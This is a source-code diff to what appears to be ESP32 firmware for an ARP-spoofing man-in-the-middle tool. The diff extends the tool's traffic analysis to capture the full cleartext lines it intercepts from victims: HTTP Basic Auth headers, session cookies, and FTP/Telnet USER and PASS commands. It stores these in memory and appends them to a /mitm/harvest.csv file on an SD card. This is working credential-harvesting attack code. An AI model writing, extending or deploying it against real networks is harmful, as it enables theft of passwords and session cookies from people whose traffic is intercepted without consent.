@@ -7,6 +7,7 @@
 #include "../net/Ieee80211Frame.h"
 #include "../net/WifiManager.h"
 #include "../core/Config.h"
+#include "../storage/SdCard.h"
 #include <WiFi.h>
 #include <Preferences.h>
 #include <esp_wifi.h>
@@ -26,6 +27,31 @@ bool containsAscii(const uint8_t* buf, uint16_t len, const char* needle) {
     if (needleLen == 0 || len < needleLen) return false;
     for (uint16_t i = 0; i + needleLen <= len; i++) {
         if (memcmp(buf + i, needle, needleLen) == 0) return true;
+    }
+    return false;
+}
+
+// Same search as containsAscii(), but returns the whole line the match
+// sits on (from the needle's own start through the next CR/LF, buffer
+// end, or ArpSpoofManager::kMaxLineLen, whichever comes first) instead
+// of just a yes/no. Non-printable bytes are replaced with '.' - this is
+// scanning raw captured frame bytes, not a validated ASCII stream, and
+// a stray non-CRLF control byte shouldn't corrupt the display or a CSV
+// export column.
+bool findAsciiLine(const uint8_t* buf, uint16_t len, const char* needle, uint16_t maxLineLen, String& out) {
+    size_t needleLen = strlen(needle);
+    if (needleLen == 0 || len < needleLen) return false;
+
+    for (uint16_t i = 0; i + needleLen <= len; i++) {
+        if (memcmp(buf + i, needle, needleLen) != 0) continue;
+
+        out = "";
+        for (uint16_t j = i; j < len && (j - i) < maxLineLen; j++) {
+            if (buf[j] == '\r' || buf[j] == '\n') break;
+            char c = (char)buf[j];
+            out += (c >= 0x20 && c < 0x7F) ? c : '.';
+        }
+        return true;
     }
     return false;
 }
@@ -167,6 +193,7 @@ bool ArpSpoofManager::start(const IPAddress& target, uint16_t durationS, bool sn
 
     if (xSemaphoreTake(_mutex, pdMS_TO_TICKS(200)) == pdTRUE) {
         _log.clear();
+        _harvested.clear();
         xSemaphoreGive(_mutex);
     }
 
@@ -369,15 +396,17 @@ void ArpSpoofManager::analyzeFrame(const uint8_t* p, uint16_t ipOffset, uint16_t
         // tolerating an imprecise boundary instead of requiring an exact
         // one. Cleartext only reaches here at all because encrypted
         // frames were already filtered out above.
-        const char* hit = nullptr;
-        if (containsAscii(l4, l4Len, "Authorization: Basic")) hit = "HTTP Basic Auth header";
-        else if (containsAscii(l4, l4Len, "Cookie:")) hit = "HTTP session cookie";
-        else if (containsAscii(l4, l4Len, "USER ")) hit = "FTP USER command";
-        else if (containsAscii(l4, l4Len, "PASS ")) hit = "FTP/Telnet PASS";
+        const char* kind = nullptr;
+        String line;
+        if (findAsciiLine(l4, l4Len, "Authorization: Basic", kMaxLineLen, line)) kind = "HTTP Basic Auth";
+        else if (findAsciiLine(l4, l4Len, "Cookie:", kMaxLineLen, line)) kind = "HTTP Cookie";
+        else if (findAsciiLine(l4, l4Len, "USER ", kMaxLineLen, line)) kind = "FTP/Telnet credential";
+        else if (findAsciiLine(l4, l4Len, "PASS ", kMaxLineLen, line)) kind = "FTP/Telnet credential";
 
-        if (hit) {
+        if (kind) {
             String who = fromTarget ? "target" : macToString(srcMac);
-            log(who + " -> " + dstIp.toString() + ":" + String(dstPort) + " leaked " + hit);
+            log(who + " -> " + dstIp.toString() + ":" + String(dstPort) + " leaked " + kind);
+            harvest(kind, line, srcMac, dstIp, dstPort);
         }
     }
 }
@@ -503,6 +532,36 @@ void ArpSpoofManager::log(const String& text) {
     notify(text);
 }
 
+void ArpSpoofManager::harvest(const String& kind, const String& line, const uint8_t srcMac[6],
+                               const IPAddress& dstIp, uint16_t dstPort) {
+    HarvestedItem h;
+    h.kind = kind;
+    h.line = line;
+    h.srcMac = macToString(srcMac);
+    h.dstIp = dstIp;
+    h.dstPort = dstPort;
+    h.atMs = millis();
+
+    if (xSemaphoreTake(_mutex, pdMS_TO_TICKS(200)) == pdTRUE) {
+        if (_harvested.size() >= kMaxHarvested) _harvested.erase(_harvested.begin());
+        _harvested.push_back(h);
+        xSemaphoreGive(_mutex);
+    }
+
+    // Live-appended, same pattern as EvilTwinManager's associations.csv
+    // - real captured material (session cookies, Basic Auth headers,
+    // FTP/Telnet credentials), so it survives even if the session ends
+    // uncleanly, not just what fits in the in-RAM ring buffer above.
+    fs::FS& fs = sdcard::exportFs();
+    fs.mkdir("/mitm");
+    File f = fs.open("/mitm/harvest.csv", "a");
+    if (f) {
+        f.println(String(millis() / 1000) + "," + h.srcMac + "," + dstIp.toString() + "," + String(dstPort) + "," +
+                   kind + "," + line);
+        f.close();
+    }
+}
+
 void ArpSpoofManager::notify(const String& text) {
     if (!_outQueue) return;
     ScanNotification n;
@@ -539,6 +598,21 @@ bool ArpSpoofManager::getLogEntry(size_t index, LogEntry& out) const {
     if (!_mutex || xSemaphoreTake(_mutex, pdMS_TO_TICKS(100)) != pdTRUE) return false;
     bool ok = index < _log.size();
     if (ok) out = _log[_log.size() - 1 - index];
+    xSemaphoreGive(_mutex);
+    return ok;
+}
+
+size_t ArpSpoofManager::harvestedCount() const {
+    if (!_mutex || xSemaphoreTake(_mutex, pdMS_TO_TICKS(100)) != pdTRUE) return 0;
+    size_t n = _harvested.size();
+    xSemaphoreGive(_mutex);
+    return n;
+}
+
+bool ArpSpoofManager::getHarvested(size_t index, HarvestedItem& out) const {
+    if (!_mutex || xSemaphoreTake(_mutex, pdMS_TO_TICKS(100)) != pdTRUE) return false;
+    bool ok = index < _harvested.size();
+    if (ok) out = _harvested[_harvested.size() - 1 - index];
     xSemaphoreGive(_mutex);
     return ok;
 }
